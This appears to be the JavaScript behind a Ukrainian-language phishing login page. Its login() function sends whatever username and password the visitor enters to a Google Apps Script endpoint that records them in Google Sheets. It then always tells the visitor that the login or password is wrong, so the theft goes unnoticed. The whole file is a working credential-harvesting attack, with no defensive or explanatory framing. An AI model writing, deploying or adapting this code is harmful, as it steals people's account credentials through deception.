function login() {
    const user = document.getElementById("username").value.trim();
    const pass = document.getElementById("password").value.trim();

    if (!user || !pass) {
        alert("Введи логін і пароль");
        return;
    }

    fetch("https://script.google.com/macros/s/AKfycbwcpN5A7o4hbxuWYgy77K35utt5zm5YRW9DPXypMAbgw2oy65aAbpH75ls_cqeqVs6GCQ/exec", {
        method: "POST",
        body: JSON.stringify({ username: user, password: pass }),
        headers: {
            "Content-Type": "application/json"
        }
    })
    .then(response => response.json())
    .then(result => {
        console.log('Дані збережено у Google Sheets:', result);
        alert("Невірний логін або пароль"); // користувач бачить помилку
    })
    .catch(error => {
        console.error('Помилка при записі в Google Sheets:', error);
    });
}
